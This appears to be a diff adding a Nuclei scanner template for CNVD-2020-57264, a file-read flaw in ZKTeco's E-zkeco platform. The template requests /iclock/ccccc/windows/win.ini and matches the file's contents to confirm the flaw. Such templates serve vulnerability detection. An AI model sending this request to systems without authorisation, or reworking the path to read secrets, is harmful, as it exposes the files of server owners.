@@ -1,0 +1,26 @@
+id: CNVD-2020-57264
+
+info:
+  name: E-zkeco - File Read
+  author: qwtd
+  severity: medium
+  reference:
+    - https://github.com/myh0st/scripts/blob/bd8e934245b1376a721368294d33c8fe286971fc/e-zkeco_CNVD-2020-57264.py#L4
+  tags: ZKTECO-时间精细化管理平台
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/iclock/ccccc/windows/win.ini"
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
